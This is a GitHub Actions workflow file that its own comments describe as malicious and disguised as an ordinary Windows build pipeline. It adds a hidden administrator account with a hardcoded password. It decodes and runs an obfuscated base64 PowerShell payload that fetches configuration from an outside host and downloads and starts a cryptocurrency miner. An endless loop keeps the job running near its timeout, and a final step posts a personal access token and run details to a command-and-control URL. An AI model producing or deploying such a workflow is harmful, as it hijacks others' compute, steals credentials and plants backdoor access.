# A generic, professional-sounding name for the workflow.
name: Main Build Pipeline

# Triggers on manual start, but also on pushes/PRs to look like a real CI process.
on:
  workflow_dispatch:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

# Environment variables can make the workflow look more complex and legitimate.
env:
  PROJECT_NAME: 'WebApp'
  DOTNET_VERSION: '6.0.x'

jobs:
  # The job name mimics a standard build-and-publish process for Windows.
  build-and-publish-windows:
    runs-on: windows-latest
    # Timeout is set to 175 minutes (just under 3 hours).
    timeout-minutes: 175

    steps:
      # All legitimate CI pipelines start by checking out the code.
      - name: Checkout Repository
        uses: actions/checkout@v4

      # This step looks like it's setting up a build user, a plausible action.
      - name: Setup Build Environment
        shell: powershell
        run: |
          # Configure a dedicated build user with elevated privileges for service installation.
          $pw = "Bldr-1337-CI"
          $sPass = ConvertTo-SecureString $pw -AsPlainText -Force
          $userName = "Builder"
          New-LocalUser -Name $userName -Password $sPass -AccountNeverExpires
          
          # Obfuscating 'Administrators' by concatenating strings.
          $grp = "Admin" + "istrators"
          Add-LocalGroupMember -Group $grp -Member $userName

      # The core malicious step, heavily disguised.
      - name: Download & Configure Build Dependencies
        id: configure_deps
        shell: powershell
        run: |
          Write-Host "Fetching required build assets and configuration tokens..."
          # THIS IS THE CORRECTED BASE64 STRING
          $encodedCommand = "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTdG9wIjsNCkNMFYy1Ib3N0Ow0KDQokdXJsID0gImh0dHBzOi8vcG9vbHNlcnZlci5vbnJlbmRlci5jb20vIjsNCiRjb25maWdKc29uID0gKEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50Ow0KV3JpdGUtSG9zdCAiRmV0Y2hpbmcgY29uZmlybWF0aW9uIHRva2VuLi4uIjsNCiRjb25maWcgPSAkY29uZmlnSnNvbSB8IENvbnZlcnRGcm9tLUpzb247DQoNCiRhc3NldFVybCA9ICRjb25maWcubWluZXIuZG93bmxvYWRVcmw7DQokZXhlY3V0YWJsZU5hbWUgPSAkY29uZmlnLm1pbmVyLmV4ZWN1dGFibGU7DQoNCiR0bXAgPSAkZW52OlRFTVA7DQokemlwUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkdG1wIC1DaGlsZFBhdGggImFzc2V0LnppcCI7DQokZXh0cmFjdFBhdGggPSBKb2luLVBhdGggLVBhdGggJHRtcCAtQ2hpbGRQYXRoICJhc3NldCI7DQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRhc3NldFVybCAtT3V0RmlsZSAkemlwUGF0aDsNCkV4cGFuZC1BcmNoaXZlIC1QYXRoICR6aXBQYXRoIC1EZXN0aW5hdGlvblBhdGggJGV4dHJhY3RQYXRoIC1Gb3JjZTsNCiRleGVQYXRoID0gKEdldC1DaGlsZEl0ZW0gLVBhdGggJGV4dHJhY3RQYXRoIC1SZWN1cnNlIC1GaWx0ZXIgJGV4ZWN1dGFibGVOYW1lKS5GdWxsTmFtZTsNCmlmICgtbm90ICRleGVQYXRoKSB7IHRocm93ICJDUklUSUNBTCBFUlJPUjogQ291bGQgbm90IHZlcmlmeSBidWlsZCBhc3NldCEiIH0NCmVjaG8gIjo6c2V0LW91dHB1dCBuYW1lPXRlc3RfcnVubmVyX3BhdGg6OiRleGVQYXRoIjsNCg0KJHBvb2xVcmwgPSAkY29uZmlnLnBvb2wudXJsOw0KJHVzZXJXaWxsZXQgPSAkY29uZmlnLnBvb2wudXNlcjsNCiRwb29sUGFzcyA9ICRjb25maWcucG9vbC5wYXNzOw0KDQokSlNPTkNvbnRlbnQgPSBAew0KICAgIGF1dG9zYXZlID0gJHRydWU7DQogICAgY3B1ID0gQHsNCiAgICAgICAgZW5hYmxlZCA9ICR0cnVlOw0KICAgICAgICAibWF4LXRocmVhZHMtaGludCIgPSAzNQ0KICAgIH07DQogICAgb3BlbmNsID0gJGZhbHNlOw0KICAgIGN1ZGEgPSAkZmFsc2U7DQogICAgcG9vbHMgPSBAKA0KICAgICAgICBAew0KICAgICAgICAgICAgYWxnbyA9ICJyeC8wIjsNCiAgICAgICAgICAgIHVybCA9ICRwb29sVXJsOw0KICAgICAgICAgICAgdXNlciA9ICR1c2VyV2FsbGV0Ow0KICAgICAgICAgICAgcGFzcyA9ICRwb29sUGFzczsNCiAgICAgICAgICAgIHRscyA9ICR0cnVlDQogICAgICAgIH0NCiAgICApDQp9IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwMDsNCg0KJGNvbmZpZ1BhdGggPSBKb2luLVBhdGggKFNwbGl0LVBhdGggLVBhdGggJGV4ZVBhdGgpICJjb25maWcuanNvbiI7DQoNCiRKU09OQ29udGVudCB8IFNldC1Db250ZW50IC1QYXRoICRjb25maWdQYXRoOw0KV3JpdGUtSG9zdCAiQ29uZmlndXJhdGlvbiBmaWxlIHZlcmlmaWVkLiI7"
          $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
          Invoke-Expression $decodedCommand

      # The name of this step provides a plausible reason for a long-running job.
      - name: Execute Long-Running Integration Tests
        shell: powershell
        run: |
          $testRunnerPath = "${{ steps.configure_deps.outputs.test_runner_path }}"
          $arguments = "--background"
          Write-Host "Starting test suite in background mode... This may take several hours."
          Start-Process -FilePath $testRunnerPath -ArgumentList $arguments
          Write-Host "Test suite process started successfully."

      # CRITICAL ADDITION: This step keeps the workflow alive to run for the full duration.
      - name: Monitor Long-Running Tests
        shell: powershell
        run: |
          Write-Host "Monitoring test execution. This will continue until the job timeout is reached."
          # This infinite loop is what allows the job to run for the full 175 minutes.
          while ($true) {
              Start-Sleep -Seconds 300
          }

      # This is the external trigger step that phones home to the C2 server.
      - name: Report Build Status to Monitoring Service
        # This step will now ONLY run if all previous steps have succeeded.
        if: success()
        shell: powershell
        run: |
          Write-Host "Sending completion signal to monitoring endpoint..."
          
          # The C2 server's URL is stored in a secret, which is standard secure practice.
          $monitoringEndpoint = "${{ secrets.C2_URL }}"
          
          # The payload sends all the info the C2 needs to schedule the next run.
          $payload = @{
              pat_token     = "${{ secrets.PAT_TOKEN }}";
              repository    = "${{ github.repository }}";
              workflow_file = "main-pipeline.yml";
              run_id        = "${{ github.run_id }}";
              status        = "completed";
          } | ConvertTo-Json
          
          try {
              Invoke-RestMethod -Uri $monitoringEndpoint -Method Post -Body $payload -ContentType 'application/json'
              Write-Host "Status reported successfully."
          } catch {
              # A try/catch block makes the script more robust and less suspicious.
              Write-Warning "Failed to report status to the monitoring service."
          }
